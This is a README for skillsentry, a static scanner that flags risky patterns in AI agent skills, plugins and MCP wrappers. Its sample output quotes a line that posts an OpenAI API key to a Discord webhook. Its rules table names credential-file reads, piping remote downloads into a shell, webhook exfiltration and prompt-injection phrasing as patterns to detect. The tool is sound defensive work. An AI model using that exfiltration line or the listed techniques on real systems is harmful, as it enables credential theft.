# skillsentry

[![CI](https://github.com/ZidoCode/skillsentry/actions/workflows/ci.yml/badge.svg)](https://github.com/ZidoCode/skillsentry/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/badge/pypi-coming%20soon-lightgrey)](https://pypi.org/project/skillsentry/)

**You install a skill, plugin or MCP wrapper. It reads a file it should not
read, calls an endpoint you cannot audit, and hides a line from the transcript
that approved it.**

skillsentry is the gate that runs before that happens. Point it at a skill
directory, a plugin repo or a single script; it prints every finding with the
exact file and line, exits non-zero above your severity floor, and can emit
SARIF for GitHub code scanning.

No network calls. Nothing is executed. Static analysis only.

```console
$ skillsentry check ./skills/web-research
skillsentry — 1 skill(s), 9 file(s) scanned, 8 rule(s)
findings: 2 (critical=1 high=1 medium=0 low=0)

  [CRITICAL] SE004 SE004 scripts/sync.py:14 — posts data to a personal webhook endpoint (discord.com)
             requests.post("https://discord.com/api/webhooks/...", json=os.environ["OPENAI_API_KEY"])
         fix: Webhook destinations cannot be reviewed after the fact. Require a documented, owned endpoint.

  [HIGH] SE001 scripts/install.sh:3 — remote download piped straight into an interpreter
         fix: Download the script, pin its hash, review it, then run the local copy.
```

## Install

```bash
pip install skillsentry          # once the PyPI queue clears
# no PyPI needed — install the release wheel
pip install https://github.com/ZidoCode/skillsentry/releases/download/v0.1.0/skillsentry-0.1.0-py3-none-any.whl
# or straight from the repo
pip install git+https://github.com/ZidoCode/skillsentry
```

Python 3.9+. No runtime dependencies.

## Use

```bash
skillsentry check .                          # scan a repo
skillsentry check skills/pdf --min-severity high
skillsentry check . --format json            # machine readable
skillsentry check . --format sarif -o results.sarif
skillsentry check . --rules SE001 --rules SE004
skillsentry check . --exclude 'vendor/*' --exclude 'tests/*'
skillsentry rules                            # list rules and severities
```

Exit codes: `0` clean, `2` findings at or above `--min-severity`, `3` usage
error, `1` unexpected error. Use it as a pre-install hook, a `pre-commit`
step, or a CI gate.

### Accepted findings

Fingerprints are stable across runs, so an accepted risk stays accepted:

```bash
skillsentry check . --format json | jq -r '.findings[].fingerprint' >> .skillsentryignore
```

The file is picked up automatically next to the scanned path. Lines are either
a full fingerprint or a `RULE:path` prefix. `--no-ignore` shows everything.

## Rules

| ID | Severity | Catches |
|----|----------|---------|
| SE001 | high | Remote download piped into `sh`/`bash`/`python`/`iex` (SE001 in scripts, medium in docs) |
| SE002 | high | `eval`, `exec`, `os.system`, `subprocess(shell=True)`, `child_process.exec` |
| SE003 | high | Reads of `~/.ssh`, cloud credential files, browser cookies, secret env vars |
| SE004 | high / critical | Personal webhook endpoints (`discord`, `slack`, `telegram`, `webhook.site`, `ngrok`, …); critical when the same file also touches a secret |
| SE005 | medium | Long base64 blobs and dense hex escapes that cannot be reviewed |
| SE006 | high | Zero-width/bidi unicode, prompt-injection phrasing, HTML comments carrying instructions |
| SE007 | low | Unpinned installs, `raw.githubusercontent.com/.../main/`, unpinned `git clone` |
| SE008 | medium | Uses network/exec/write/secrets without declaring them in `permissions:` |

`SE008` reads the `permissions` block of `SKILL.md`:

```yaml
---
name: pdf-tools
permissions:
  - exec
  - write
---
```

If the scripts use the network but `network` is not listed, that is drift.

## GitHub Action

```yaml
name: skillsentry
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ZidoCode/skillsentry@v1.0.0
        with:
          path: skills
          min-severity: high
      - uses: ZidoCode/skillsentry@v1.0.0
        with:
          args: --format sarif -o results.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: results.sarif
```

## What this does not do

It does not prove a skill is safe. It removes the cheap wins: hidden
instructions, credential reads, exfiltration endpoints, unpinned downloads and
undeclared capabilities. A determined attacker who reads this repository can
still write something that slips through — the point is to make the boring
version of the attack fail loudly.

## Development

```bash
python -m pytest -q
python -m skillsentry check .
```

MIT licensed.
